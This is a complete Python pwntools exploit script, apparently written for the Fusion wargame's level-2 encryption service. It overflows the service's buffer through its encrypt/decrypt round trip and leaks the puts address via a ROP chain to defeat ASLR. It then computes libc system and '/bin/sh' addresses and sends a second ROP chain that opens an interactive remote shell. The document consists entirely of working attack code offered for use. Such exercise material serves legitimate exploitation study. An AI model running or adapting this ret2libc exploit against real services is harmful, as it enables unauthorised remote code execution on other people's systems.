# Attempt nr 2

import struct
import time
import pwn
import sys


RHOST = 'fusion'
RPORT = 20002 
BUFFER_SIZE = 32 * 4096

BANNER = '[-- Enterprise configuration file encryption service --]\n'

def main():
    io = pwn.remote(RHOST, RPORT)
    print(io.recvline())

    libc_puts_address = get_libc_puts_address(io)

    libc_system_address, libc_exit_address, bin_sh_address = calculate_libc_addresses(libc_puts_address)

    # get_libc_puts_address threw us back into encrypt_file, so we can exploit as normal
    exploit(io, libc_system_address, libc_exit_address, bin_sh_address)


def send_encryption(io, data):
    command = b'E'
    length_bytes = pwn.p32(len(data))
    command += length_bytes

    command += data
    io.send(command)

    print(io.recvline())
    
    received_length = pwn.u32(io.recv(4))
    received_data = io.recvn(received_length)

    print('Sent data size: {}'.format(len(data)))
    print('Received size response: {}'.format(received_length))
    print('Received data size is: {}'.format(len(received_data)))

    return received_data


def send_quit(io):
    io.send(b'Q')

def libc_assemble_payload():
    puts_plt_got = 0x08048930 # puts@plt
    puts_got = 0x0804b3b8 # The address which contains the location where the instruction flow will jump from puts@plt. 
    return_address = 0x080497f7 # Address of the encrypt_file function

    rop_chain = [
        puts_plt_got, 
        return_address,
        puts_got
    ]
    rop_chain = b''.join([pwn.p32(r) for r in rop_chain])

    junk = b'A' * BUFFER_SIZE + b'B' * 16 
    payload = junk
    payload += rop_chain
    
    return payload
    
def calculate_libc_addresses(libc_puts_address: int) -> (int, int, int):
    libc = pwn.ELF('./libc6_2.13-20ubuntu5_i386.so')
    # print('libc system function address without ASLR is: {}'.format(hex(libc.symbols['system'])))

    libc.address = libc_puts_address - libc.symbols['puts'] # Set the new ASLR'd base address

    print('libc base address is: {}'.format(hex(libc.address)))

    libc_system_address = libc.symbols['system']
    print('libc system function address is: {}'.format(hex(libc_system_address)))
    
    libc_exit_address = libc.symbols['exit'] # Just used to exit cleanly after shell closed
    print('libc exit function address is: {}'.format(hex(libc_exit_address)))

    libc_binsh_address = next(libc.search(b'/bin/sh'))
    print('libc /bin/sh string address is: {}'.format(hex(libc_binsh_address)))

    return (libc_system_address, libc_exit_address, libc_binsh_address)


def get_libc_puts_address(io) -> int:
    time.sleep(1)
    payload = libc_assemble_payload()

    time.sleep(1)
    ciphered = send_encryption(io, payload)

    time.sleep(1)
    unciphered = send_encryption(io, ciphered)

    if unciphered == payload:
        print('Yay, the service returned the initial payload. The memory should be set up with the payload now.')
    else:
        print('ERROR: The service didn\'t return the initial payload!')

    time.sleep(1)
    send_quit(io)

    libc_puts_address = pwn.u32(io.recvn(4))
    print('Found address for libc puts: {}'.format(hex(libc_puts_address)))

    # Throw away the rest of the sent text
    while io.can_recv():
        io.recv()

    return libc_puts_address

def assemble_payload(libc_system_address: int, libc_exit_address: int, bin_sh_address: int):
    return_address = libc_exit_address
    rop_chain = [
        libc_system_address, 
        return_address,
        bin_sh_address
    ]
    rop_chain = b''.join([pwn.p32(r) for r in rop_chain])

    junk = b'A' * BUFFER_SIZE + b'B' * 16 
    payload = junk
    payload += rop_chain
    
    return payload
    
def exploit(io, libc_system_address: int, libc_exit_address: int, bin_sh_address: int):
    time.sleep(1)
    payload = assemble_payload(libc_system_address, libc_exit_address, bin_sh_address)

    ciphered = send_encryption(io, payload)

    time.sleep(1)
    unciphered = send_encryption(io, ciphered)

    if unciphered == payload:
        print('Yay, the service returned the initial payload. The memory should be set up with the payload now.')
    else:
        print('ERROR: The service didn\'t return the initial payload!')

    time.sleep(1)
    send_quit(io)

    io.interactive()

if __name__ == "__main__":
    main()
